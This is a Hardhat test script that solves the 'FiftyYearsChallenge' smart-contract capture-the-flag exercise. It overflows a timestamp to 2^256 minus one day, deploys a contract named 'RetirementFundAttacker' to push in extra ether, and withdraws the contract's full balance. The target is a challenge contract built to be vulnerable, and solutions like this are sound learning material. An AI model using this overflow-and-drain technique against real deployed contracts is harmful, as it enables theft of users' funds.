import {ethers} from "hardhat";
import {BigNumber,Contract, Signer} from "ethers";
import {expect} from "chai";

let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let sendValue = ethers.utils.parseEther("1");

before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("FiftyYearsChallenge", attacker);
    contract = factory.attach(`0xa45510349f77764bE2FBf6639bd5e144713C6a11`);
});

it("solves the challenge", async function () {
    const ONE_DAY = 24 * 60 * 60;
    const DATE_OVERFLOW = BigNumber.from(`2`).pow(`256`).sub(ONE_DAY);
    await contract.upsert(1,DATE_OVERFLOW,{value:1,gasLimit:1e5});
    await contract.upsert(2,0,{value:2,gasLimit:1e5});
    const factory = await ethers.getContractFactory("RetirementFundAttacker", attacker);
    let attackerContract = await factory.deploy(contract.address,{value:2,gasLimit:1e5});
    await contract.withdraw(2,{gasLimit:1e5});

});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});